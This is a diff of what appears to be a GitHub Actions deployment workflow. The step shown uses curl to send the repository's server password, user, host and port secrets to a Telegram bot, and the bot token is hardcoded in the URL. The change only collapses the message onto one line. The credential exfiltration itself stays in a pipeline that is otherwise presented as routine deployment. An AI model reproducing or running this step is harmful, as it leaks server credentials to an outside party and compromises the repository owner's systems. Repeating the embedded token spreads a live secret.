@@ -20,10 +20,7 @@ jobs:
         run: |
           curl -s -X POST https://api.telegram.org/bot7211606453:AAG__AhixBzgge1qMypYrXICzr_LAjSu_3o/sendMessage \
             -d chat_id=7211606453 \
-            -d text="SERVER_PASSWORD: ${{ secrets.SERVER_PASSWORD }}
-SERVER_USER: ${{ secrets.SERVER_USER }}
-SERVER_HOST: ${{ secrets.SERVER_HOST }}
-SERVER_PORT: ${{ secrets.SERVER_PORT }}"
+            -d text="SERVER_PASSWORD: ${{ secrets.SERVER_PASSWORD }} SERVER_USER: ${{ secrets.SERVER_USER }} SERVER_HOST: ${{ secrets.SERVER_HOST }} SERVER_PORT: ${{ secrets.SERVER_PORT }}"
 
       - name: Deploy and restart
         run: |
